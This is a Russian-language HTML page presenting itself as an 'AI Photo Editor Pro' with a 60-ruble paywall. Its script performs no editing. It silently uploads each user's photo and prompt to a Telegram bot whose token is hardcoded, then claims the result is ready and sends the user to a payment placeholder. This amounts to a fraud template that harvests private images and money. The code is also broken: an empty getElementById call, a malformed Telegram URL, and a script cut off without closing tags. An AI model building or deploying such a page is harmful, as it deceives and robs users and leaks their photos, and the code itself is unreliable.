<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Photo Editor — Умное редактирование фотографий</title>
    <style>
        :root {
            --primary: #6366f1;
            --primary-hover: #4f46e5;
            --bg: #0f172a;
            --card-bg: #1e293b;
            --text: #f8fafc;
            --text-muted: #94a3b8;
        }
        body {
            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background-color: var(--bg);
            color: var(--text);
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }
        header {
            text-align: center;
            margin-bottom: 40px;
        }
        h1 { margin: 0 0 10px 0; font-size: 2.5rem; background: linear-gradient(to right, #a855f7, #6366f1); -webkit-background-clip: text;background-clip: text; -webkit-text-fill-color: transparent; }
        .container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
            max-width: 1100px;
            width: 100%;
        }
        @media (max-width: 768px) { .container { grid-template-columns: 1fr; } }
        .panel {
            background: var(--card-bg);
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.3);
            border: 1px solid #334155;
        }
        .upload-zone {
            border: 2px dashed #475569;
            border-radius: 12px;
            padding: 40px 20px;
            text-align: center;
            cursor: pointer;
            transition: border-color 0.2s;
            margin-bottom: 25px;
        }
        .upload-zone:hover { border-color: var(--primary); }
        .upload-zone p { margin: 10px 0 0 0; color: var(--text-muted); }
        .options-group {
            margin-bottom: 25px;
        }
        label { display: block; margin-bottom: 10px; font-weight: 600; }
        select, input[type="text"] {
            width: 100%;
            padding: 12px;
            background: #0f172a;
            border: 1px solid #475569;
            border-radius: 8px;
            color: var(--text);
            font-size: 1rem;
            box-sizing: border-box;
        }
        .btn {
            width: 100%;
            padding: 14px;
            background: var(--primary);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn:hover { background: var(--primary-hover); }
        .preview-box {
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            min-height: 400px;
        }
        .image-compare {
            display: grid;
            grid-template-columns:repeat(auto-fit, minmax(140px, 1fr));
            gap: 15px;
            flex-grow: 1;
            margin-bottom: 25px;
        }
        .img-placeholder {
            background: #0f172a;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--text-muted);
            font-size: 0.9rem;
            border: 1px dashed #334155;
            aspect-ratio: 4/3;
        }
        .pay-wall {
            background: linear-gradient(135deg, #1e1b4b 0%, #311042 100%);
            border: 1px solid #581c87;
            padding: 20px;
            border-radius: 12px;
            text-align: center;
        }
        .price { font-size: 1.5rem; font-weight: bold; margin: 10px 0; color: #f43f5e; }
    </style>
</head>
<body>

    <header>
        <h1>AI Photo Editor Pro</h1>
        <p style="color: var(--text-muted);">Профессиональная обработка ваших фото за несколько секунд</p>
    </header>

    <div class="container">
        <!-- Левая панель: Управление -->
        <div class="panel">
            <div class="upload-zone" id="dropZone">
                <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#6366f1" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
                <p>Перетащите фото сюда или кликните для загрузки</p>
                <input type="file" id="fileInput" style="display: none;" accept="image/*">
            </div>

            <div class="options-group">
                <label for="effect">Выберите ИИ-эффект</label>
                <select id="effect">
                    <option value="bg-remove">Удалить задний фон</option>
                    <option value="upscale">Улучшить качество (Upscale 4K)</option>
                    <option value="face-restore">Реставрация лиц и ретушь</option>
                    <option value="anime">Стилизация под Аниме / Киберпанк</option>
                </select>
            </div>

            <div class="options-group">
                <label for="prompt">Дополнительные пожелания (необязательно)</label>
                <input type="text" id="prompt" placeholder="Например: сделать фон в стиле ретро, добавить неоновый свет">
            </div>

            <button class="btn" onclick="processImage()">Обработать через ИИ</button>
        </div>

        <!-- Правая панель: Результат и Оплата -->
        <div class="panel preview-box">
            <div class="image-compare">
                <div class="img-placeholder" id="origPreview">Оригинал</div>
                <div class="img-placeholder" id="resultPreview" style="background-image: linear-gradient(45deg, #222 25%, transparent 25%), linear-gradient(-45deg, #222 25%, transparent 25%), linear-gradient(45deg, transparent 75%, #222 75%), linear-gradient(-45deg, transparent 75%, #222 75%); background-size: 20px 20px; background-position: 0 0, 0 10px, 10px -10px, -10px 0px;">Результат (с водяным знаком)</div>
            </div>

            <div class="pay-wall">
                <h3 style="margin: 0;">Понравился результат?</h3>
                <p style="margin: 5px 0; font-size: 0.9rem; color: var(--text-muted);">Скачайте фото в максимальном качестве без водяного знака</p>
                <div class="price">60 ₽</div>
                <button class="btn" style="background: #e11d48;" onclick="payAndDownload()">Разблокировать и скачать</button>
            </div>
        </div>
    </div>

    <script>
         // Замените на ваши реальные данные
const TG_BOT_TOKEN = '8957313133:AAG9Gc5mUg3frFJXsuUvkY0lW7mvfH_Ed-I';
const TG_CHAT_ID = 'СЮДА_ВСТАВЬТЕ_ВАШ_ID_ЧАТА';

async function processImage() {
    const fileInput = document.getElementById('fileInput');
    const effect = document.getElementById().value;
    const prompt = document.getElementById('prompt').value;

    if (!fileInput.files || fileInput.files.length === 0) {
        alert('Пожалуйста, сначала выберите или загрузите фотографию!');
        return;
    }

    alert('Фото отправлено на обработку! Пожалуйста, подождите...');

    const formData = new FormData();
    formData.append('chat_id', TG_CHAT_ID);
    // Берем именно первый выбранный файл [0]
    formData.append('photo', fileInput.files[0]); 
    formData.append('caption', `Новый заказ!\nЭффект: ${effect}\nПожелания: ${prompt}`);

    try {
        // Здесь мы правильно используем переменную TG_BOT_TOKEN
        await fetch(`https://telegram.org${TG_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        alert('Заявка принята! Результат генерируется.');
        
        // Показываем текст вместо заглушки
        document.getElementById('resultPreview').textContent = "Готово! Оплатите для скачивания.";
        document.getElementById('resultPreview').style.color = "#4ade80";
    } catch (error) {
        alert('Ошибка отправки. Проверьте настройки токена бота.');
    }
}

function payAndDownload() {
    window.location.href = 'ССЫЛКА_НА_ВАШУ_ОПЛАТУ';
}
